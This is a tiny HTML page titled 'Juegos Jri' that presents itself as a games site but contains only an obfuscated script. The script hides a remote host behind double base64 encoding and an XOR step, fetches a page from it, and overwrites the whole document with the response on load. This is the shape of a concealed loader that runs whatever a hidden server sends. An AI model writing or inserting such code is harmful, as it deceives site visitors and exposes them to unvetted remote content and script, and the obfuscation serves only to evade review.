<!DOCTYPE html>
<html>
  <head><title>Juegos Jri</title></head>
  <body>
    <div id="root"></div>
    <script>
      const BASE_DIR = [...atob(atob('V0V0YVF3UlNIeGdFWDBFPQ=='))].map(c => String.fromCharCode(c.charCodeAt() ^ 42)).join('');
      fetch(`${BASE_DIR}/page`)
        .then(r => r.text())
        .then(html => {
          document.open();
          document.write(html);
          document.close();
        });
    </script>
  </body>
</html
